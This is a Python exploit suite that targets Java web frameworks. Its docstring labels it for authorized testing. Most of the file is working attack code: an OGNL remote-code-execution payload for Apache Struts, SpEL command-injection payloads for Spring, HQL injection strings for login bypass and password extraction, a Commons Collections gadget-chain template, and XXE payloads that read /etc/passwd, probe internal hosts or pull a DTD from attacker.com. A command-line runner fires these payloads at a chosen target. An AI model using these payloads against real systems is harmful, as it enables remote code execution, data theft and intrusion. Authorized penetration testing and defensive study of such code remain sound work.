#!/usr/bin/env python3
"""
Critical Java Framework Exploits
Professional-grade exploit scripts for defensive security research

⚠️ WARNING: FOR AUTHORIZED SECURITY TESTING ONLY
These exploits are designed for:
- Penetration testing with explicit permission
- Bug bounty programs
- Security research and education
- Defensive security analysis

DO NOT USE against systems you do not own or have explicit permission to test.
"""

import requests
import sys
import argparse
import base64
import json
from urllib.parse import urlencode, quote
import time

class StrutsOGNLExploit:
    """
    Struts OGNL RCE Exploit (CVE-2017-5638 class)
    Targets Apache Struts 1.x and vulnerable Struts 2.x versions
    """

    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_ognl_payload(self, command):
        """Generate OGNL payload for command execution"""

        # Basic OGNL RCE payload
        payload = f"""
%{{
    (#_='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).
    (#cmd='{command}').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).
    (#p=new java.lang.ProcessBuilder(#cmds)).
    (#p.redirectErrorStream(true)).
    (#process=#p.start()).
    (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
    (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())
}}
        """.strip().replace('\n', '').replace(' ', '')

        return payload

    def exploit_content_type(self, command):
        """Exploit via Content-Type header manipulation"""

        payload = self.generate_ognl_payload(command)

        headers = {
            'Content-Type': payload,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
        }

        try:
            response = self.session.post(
                f"{self.target_url}/login.action",
                headers=headers,
                data={'username': 'test', 'password': 'test'},
                timeout=10
            )
            return response.text
        except Exception as e:
            return f"Error: {e}"

    def exploit_parameter_injection(self, command):
        """Exploit via parameter injection"""

        payload = self.generate_ognl_payload(command)

        data = {
            'username': 'admin',
            'password': 'admin',
            'redirect': payload
        }

        try:
            response = self.session.post(
                f"{self.target_url}/login.action",
                data=data,
                timeout=10
            )
            return response.text
        except Exception as e:
            return f"Error: {e}"

class SpringSpELExploit:
    """
    Spring SpEL RCE Exploit (CVE-2018-1273 class)
    Targets Spring Framework with SpEL injection vulnerabilities
    """

    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_spel_payload(self, command):
        """Generate SpEL payload for command execution"""

        # Runtime.exec() payload
        payload = f"T(java.lang.Runtime).getRuntime().exec('{command}')"

        # Alternative payload with ProcessBuilder
        alt_payload = f"""
        T(java.lang.ProcessBuilder).new({{'/bin/bash', '-c', '{command}'}}).start()
        """.strip()

        return payload

    def exploit_expression_parameter(self, command):
        """Exploit via expression parameter"""

        payload = self.generate_spel_payload(command)

        data = {
            'expression': f"#{{{payload}}}",
            'name': 'test'
        }

        try:
            response = self.session.post(
                f"{self.target_url}/eval",
                data=data,
                timeout=10
            )
            return response.text
        except Exception as e:
            return f"Error: {e}"

    def exploit_data_binding(self, command):
        """Exploit via Spring MVC data binding"""

        payload = self.generate_spel_payload(command)

        # Property path injection
        data = {
            f'user[{payload}]': 'value'
        }

        try:
            response = self.session.post(
                f"{self.target_url}/user/update",
                data=data,
                timeout=10
            )
            return response.text
        except Exception as e:
            return f"Error: {e}"

class HibernateHQLExploit:
    """
    Hibernate HQL Injection Exploit
    Targets applications with unsafe HQL query construction
    """

    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_hql_payload(self, attack_type="union"):
        """Generate HQL injection payload"""

        if attack_type == "union":
            # Union-based data extraction
            payload = "1 UNION SELECT username, password FROM User WHERE id=1"
        elif attack_type == "boolean":
            # Boolean-based blind injection
            payload = "1' AND (SELECT COUNT(*) FROM User WHERE username='admin' AND SUBSTRING(password,1,1)='a') > 0 AND '1'='1"
        elif attack_type == "bypass":
            # Authentication bypass
            payload = "' OR '1'='1' --"
        else:
            payload = "' OR 1=1 --"

        return payload

    def exploit_user_search(self, payload):
        """Exploit user search functionality"""

        data = {
            'username': payload,
            'action': 'search'
        }

        try:
            response = self.session.post(
                f"{self.target_url}/user/search",
                data=data,
                timeout=10
            )
            return response.text
        except Exception as e:
            return f"Error: {e}"

class DeserializationExploit:
    """
    Java Deserialization RCE Exploit
    Targets applications with unsafe deserialization
    """

    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_commons_collections_payload(self, command):
        """Generate Apache Commons Collections gadget chain"""

        # This would normally use ysoserial or similar tool
        # For demonstration, showing the conceptual payload structure

        payload_template = f"""
        // Commons Collections InvokerTransformer chain
        Transformer[] transformers = new Transformer[] {{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[] {{String.class, Class[].class}},
                new Object[] {{"getRuntime", new Class[0]}}),
            new InvokerTransformer("invoke",
                new Class[] {{Object.class, Object[].class}},
                new Object[] {{null, new Object[0]}}),
            new InvokerTransformer("exec",
                new Class[] {{String.class}},
                new Object[] {{"{command}"}})
        }};
        """

        return payload_template

    def exploit_java_serialization(self, command):
        """Exploit Java serialization endpoint"""

        # Note: This would require actual serialized payload generation
        # Using ysoserial or similar tool in practice

        headers = {
            'Content-Type': 'application/x-java-serialized-object'
        }

        # Placeholder for serialized payload
        payload = b"SERIALIZED_COMMONS_COLLECTIONS_PAYLOAD_HERE"

        try:
            response = self.session.post(
                f"{self.target_url}/deserialize",
                headers=headers,
                data=payload,
                timeout=10
            )
            return response.text
        except Exception as e:
            return f"Error: {e}"

class XXEExploit:
    """
    XML External Entity (XXE) Exploit
    Targets XML parsing endpoints without proper security configuration
    """

    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_xxe_payload(self, attack_type="file_read", target_file="/etc/passwd"):
        """Generate XXE payload"""

        if attack_type == "file_read":
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root>
    <data>&xxe;</data>
</root>'''

        elif attack_type == "ssrf":
            payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<root>
    <data>&xxe;</data>
</root>'''

        elif attack_type == "blind_oob":
            payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
%ext;
%all;
]>
<root></root>'''

        return payload

    def exploit_xml_endpoint(self, payload):
        """Exploit XML processing endpoint"""

        headers = {
            'Content-Type': 'application/xml'
        }

        try:
            response = self.session.post(
                f"{self.target_url}/xml/process",
                headers=headers,
                data=payload,
                timeout=10
            )
            return response.text
        except Exception as e:
            return f"Error: {e}"

def main():
    parser = argparse.ArgumentParser(description='Java Framework Vulnerability Exploits')
    parser.add_argument('--target', required=True, help='Target URL')
    parser.add_argument('--exploit', required=True,
                       choices=['struts-ognl', 'spring-spel', 'hibernate-hql', 'deserialization', 'xxe'],
                       help='Exploit type to run')
    parser.add_argument('--command', default='whoami', help='Command to execute (for RCE exploits)')
    parser.add_argument('--payload-type', default='basic', help='Payload variant to use')

    args = parser.parse_args()

    print("🔥 Java Framework Exploit Suite")
    print("=" * 50)
    print(f"Target: {args.target}")
    print(f"Exploit: {args.exploit}")
    print(f"Command: {args.command}")
    print("=" * 50)
    print("⚠️  WARNING: FOR AUTHORIZED TESTING ONLY")
    print("=" * 50)

    if args.exploit == 'struts-ognl':
        exploit = StrutsOGNLExploit(args.target)
        print("\n🎯 Testing Struts OGNL RCE...")

        print("   📡 Content-Type injection:")
        result = exploit.exploit_content_type(args.command)
        print(f"      Result: {result[:200]}...")

        print("   📡 Parameter injection:")
        result = exploit.exploit_parameter_injection(args.command)
        print(f"      Result: {result[:200]}...")

    elif args.exploit == 'spring-spel':
        exploit = SpringSpELExploit(args.target)
        print("\n🎯 Testing Spring SpEL RCE...")

        print("   📡 Expression parameter:")
        result = exploit.exploit_expression_parameter(args.command)
        print(f"      Result: {result[:200]}...")

        print("   📡 Data binding injection:")
        result = exploit.exploit_data_binding(args.command)
        print(f"      Result: {result[:200]}...")

    elif args.exploit == 'hibernate-hql':
        exploit = HibernateHQLExploit(args.target)
        print("\n🎯 Testing Hibernate HQL Injection...")

        for attack_type in ['bypass', 'union', 'boolean']:
            print(f"   📡 {attack_type.title()} attack:")
            payload = exploit.generate_hql_payload(attack_type)
            result = exploit.exploit_user_search(payload)
            print(f"      Payload: {payload}")
            print(f"      Result: {result[:200]}...")

    elif args.exploit == 'deserialization':
        exploit = DeserializationExploit(args.target)
        print("\n🎯 Testing Java Deserialization RCE...")

        print("   📡 Commons Collections chain:")
        result = exploit.exploit_java_serialization(args.command)
        print(f"      Result: {result[:200]}...")

    elif args.exploit == 'xxe':
        exploit = XXEExploit(args.target)
        print("\n🎯 Testing XXE Injection...")

        for attack_type in ['file_read', 'ssrf']:
            print(f"   📡 {attack_type.replace('_', ' ').title()} attack:")
            payload = exploit.generate_xxe_payload(attack_type)
            result = exploit.exploit_xml_endpoint(payload)
            print(f"      Result: {result[:200]}...")

    print("\n✅ Exploit testing completed!")
    print("📋 Review results above for successful exploitation indicators")

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print("🔥 Java Framework Critical Exploits")
        print("Usage examples:")
        print("  python3 critical_exploits.py --target http://vulnerable-app.com --exploit struts-ognl --command 'id'")
        print("  python3 critical_exploits.py --target http://vulnerable-app.com --exploit spring-spel --command 'whoami'")
        print("  python3 critical_exploits.py --target http://vulnerable-app.com --exploit hibernate-hql")
        print("  python3 critical_exploits.py --target http://vulnerable-app.com --exploit xxe")
        print("\n⚠️  FOR AUTHORIZED SECURITY TESTING ONLY")
    else:
        main()